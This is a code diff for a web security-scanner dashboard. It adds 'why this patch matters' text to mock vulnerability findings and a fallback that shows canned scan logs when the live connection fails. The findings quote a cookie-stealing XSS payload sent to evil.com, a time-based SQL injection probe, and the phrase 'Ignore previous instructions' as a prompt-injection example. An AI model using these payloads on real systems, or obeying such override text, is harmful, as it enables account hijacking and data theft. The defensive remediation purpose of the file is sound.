@@ -33,6 +33,7 @@ interface ScanFinding {
   line: number
   description: string
   fix: string
+  importance: string
 }
 
 interface RunScan {
@@ -64,6 +65,7 @@ const findingsForTarget = (target: string): ScanFinding[] => {
         id: `F-${Date.now()}-1`, title: "Reentrancy in withdraw()", severity: "critical",
         file: "contracts/Vault.sol", line: 89,
         description: "External call before state update (CEI pattern violation). Attacker deploys a malicious fallback that re-enters withdraw() repeatedly, draining the contract.",
+        importance: "A single exploit transaction drains 100% of contract funds — projects have lost $60M+ to reentrancy. ReentrancyGuard + CEI pattern is zero-cost to add and eliminates the entire attack surface permanently.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 function withdraw(uint256 amount) external {
     require(balances[msg.sender] >= amount, "Insufficient");
@@ -95,6 +97,7 @@ contract SecureVault is ReentrancyGuard {
         id: `F-${Date.now()}-2`, title: "Missing access control on setFee()", severity: "high",
         file: "contracts/Governance.sol", line: 45,
         description: "setFee() has no access control — any address can set protocol fees to 100% and drain all pending liquidity. Confirmed exploitable.",
+        importance: "Any anonymous wallet can raise fees to 100% in one transaction, instantly redirecting all user funds to the attacker. One onlyRole modifier closes this before it is found by an on-chain scanner.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 function setFee(uint256 newFee) external {     // ← anyone can call this
     protocolFee = newFee;
@@ -122,6 +125,7 @@ contract Governance is AccessControl {
         id: `F-${Date.now()}-3`, title: "Flash loan attack surface in swap()", severity: "high",
         file: "contracts/Pool.sol", line: 134,
         description: "Price calculation uses spot price (token.balanceOf) which is trivially manipulable with a flash loan. Attacker borrows, distorts price, profits, repays in one transaction.",
+        importance: "Flash loan attacks are risk-free for the attacker — they borrow millions, distort your price in one block, and profit without upfront capital. A TWAP oracle averaging prices over time makes single-block manipulation economically infeasible.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 function getPrice() public view returns (uint256) {
     return tokenA.balanceOf(address(this)) /
@@ -152,6 +156,7 @@ function getTWAPPrice(address pool, uint32 twapWindow)
         id: `F-${Date.now()}-1`, title: "Hardcoded API secret in source", severity: "critical",
         file: "src/config/api.ts", line: 8,
         description: "API secret key hardcoded in source — present in git history. Any repository clone permanently leaks the credential. Confirmed via SAST pattern match.",
+        importance: "Automated scanners harvest API keys from repos within minutes of a push. The credential lives in git history forever — even after deletion, anyone with a prior clone retains it. Rotate now and move to an environment variable to stop ongoing abuse.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 const API_SECRET = "sk-live-abc123def456xyz";   // ← in git history forever
 
@@ -182,6 +187,7 @@ API_SECRET=sk-live-your-real-key-here
         id: `F-${Date.now()}-2`, title: "Prompt injection in LLM chat endpoint", severity: "critical",
         file: "src/api/chat.ts", line: 23,
         description: "User input is string-concatenated into the LLM system prompt. Attackers inject 'Ignore previous instructions' to override safety guardrails and exfiltrate context.",
+        importance: "Attackers override your AI's safety rules and leak confidential system prompts, weaponizing your assistant against your own users — destroying trust and violating AI provider terms of service. Separating user input into its own message turn closes this with no functional impact.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 const response = await openai.chat.completions.create({
   model: "gpt-4o",
@@ -220,6 +226,7 @@ if (mod.results[0].flagged) throw new Error("Input flagged by moderation")`,
         id: `F-${Date.now()}-3`, title: "Dependency confusion attack (supply chain)", severity: "high",
         file: "package.json", line: 0,
         description: "Internal package names like '@company/utils' are not scoped to a private registry. A malicious public npm package with the same name would be installed instead.",
+        importance: "A malicious public package silently executes attacker code with full build-environment permissions — accessing secrets, tokens, and production infrastructure with zero warning. Pinning to a private registry index is a one-line .npmrc change.",
         fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 // package.json — internal packages not pinned to private registry
 {
@@ -257,6 +264,7 @@ if (mod.results[0].flagged) throw new Error("Input flagged by moderation")`,
       id: `F-${Date.now()}-1`, title: "Reflected XSS on /search", severity: "critical",
       file: "/search?q=", line: 0,
       description: "User input reflected in the DOM without encoding. Payload: <script>fetch('https://evil.com?c='+document.cookie)</script> steals session cookies cross-origin.",
+      importance: "One malicious link shared in any channel silently hijacks every user who clicks it — full account control, no password required. HTML-encoding the reflected value is a one-line change that eliminates mass account takeover risk entirely.",
       fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 // Express / Node.js
 app.get('/search', (req, res) => {
@@ -287,6 +295,7 @@ headers: [{ key: "Content-Security-Policy",
       id: `F-${Date.now()}-2`, title: "SQL Injection in search API", severity: "critical",
       file: "/api/search", line: 0,
       description: "Blind time-based SQLi confirmed via payload: ' AND SLEEP(5)--. Full database read/write via UNION-based extraction. Affects all SQL dialects.",
+      importance: "An attacker can read, modify, or delete your entire database with a single crafted HTTP request — exposing all user PII and payment data. This triggers mandatory GDPR and PCI-DSS breach notifications with potential fines up to 4% of annual revenue.",
       fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 // Raw string interpolation into SQL — NEVER do this
 const results = await db.query(
@@ -318,6 +327,7 @@ const [rows] = await db.execute(
       id: `F-${Date.now()}-3`, title: "BOLA — Broken Object Level Authorization", severity: "critical",
       file: "/api/users/[id]/profile", line: 0,
       description: "OWASP API #1: /api/users/:id does not verify resource ownership. Any logged-in user can read or modify any other user's profile by changing the ID in the URL.",
+      importance: "Any authenticated user accesses any other account's private data by changing one number in the URL — no hacking tools required. This is the root cause of most API data breaches reported today and violates GDPR data minimization by default.",
       fix: `// ── BEFORE (vulnerable) ────────────────────────────────
 // Missing ownership check — any authenticated user can access any :id
 app.get("/api/users/:id/profile", authenticate, async (req, res) => {
@@ -347,6 +357,7 @@ app.get("/api/users/:id/profile", authenticate, async (req, res) => {
       id: `F-${Date.now()}-4`, title: "Missing security headers (CSP, HSTS, X-Frame-Options)", severity: "high",
       file: "next.config.mjs", line: 1,
       description: "No Content-Security-Policy — trivial XSS via any injected script. No HSTS — SSL-stripping possible on first visit. No X-Frame-Options — clickjacking risk.",
+      importance: "Three free HTTP headers each eliminate an entire attack class. Without them, injected scripts run unconstrained and first-visit SSL-stripping silently intercepts user credentials. They deploy in under five minutes with zero user-visible impact.",
       fix: `// next.config.mjs — comprehensive security headers
 const securityHeaders = [
   { key: "Content-Security-Policy",
@@ -453,9 +464,43 @@ export default function DashboardPage() {
     })
 
     es.addEventListener("error", () => {
-      // Connection dropped — fall back to the local mock ticker
+      // SSE failed (server down, rate limit, network) — fall back to local mock ticker
       es.close()
       esMapRef.current.delete(id)
+
+      const fallbackLogs = [
+        "[INFO] Target reachable — fingerprinting stack",
+        "[INFO] Running OWASP ZAP active + passive scan",
+        "[INFO] Checking OWASP API Top 10 vectors (BOLA, BFLA, injection)",
+        "[WARN] Potential vulnerability detected — escalating to Triage Agent",
+        "[INFO] Fix Agent generating language-specific remediation code",
+        "[DONE] Scan complete — fix code ready",
+      ]
+      let pct = 0
+      const ticker = setInterval(() => {
+        pct = Math.min(pct + 3.5, 100)
+        const logIdx = Math.floor((pct / 100) * fallbackLogs.length)
+        const status: RunScan["status"] = pct >= 80 ? "reporting" : pct >= 50 ? "analyzing" : "scanning"
+
+        setScans((prev) => {
+          const scan = prev.find((s) => s.id === id)
+          if (!scan) { clearInterval(ticker); return prev }
+          const newLogs = [...scan.logs]
+          if (logIdx < fallbackLogs.length && !newLogs.includes(fallbackLogs[logIdx])) {
+            newLogs.push(fallbackLogs[logIdx])
+          }
+          const updated = { ...scan, progress: pct, status, logs: newLogs }
+          if (pct >= 100) {
+            clearInterval(ticker)
+            if (!completedIdsRef.current.has(id)) {
+              completedIdsRef.current.add(id)
+              setTimeout(() => completeScan({ ...updated, progress: 100 }), 400)
+            }
+            return prev.filter((s) => s.id !== id)
+          }
+          return prev.map((s) => (s.id === id ? updated : s))
+        })
+      }, 800)
     })
   }
 
@@ -672,6 +717,17 @@ export default function DashboardPage() {
                                   </div>
                                 </div>
                                 <Badge variant="outline" className={`text-[10px] shrink-0 ${severityBadge[finding.severity]}`}>{finding.severity.toUpperCase()}</Badge>
+                              </div>
+
+                              {/* Why this patch matters */}
+                              <div className="px-3 pb-2">
+                                <div className="rounded-md border border-warning/30 bg-warning/5 px-3 py-2">
+                                  <p className="text-[10px] font-semibold text-warning uppercase tracking-wider mb-1 flex items-center gap-1.5">
+                                    <AlertTriangle className="h-3 w-3" />
+                                    Why this patch matters
+                                  </p>
+                                  <p className="text-xs text-foreground/80 leading-relaxed">{finding.importance}</p>
+                                </div>
                               </div>
 
                               {/* Fix code block */}
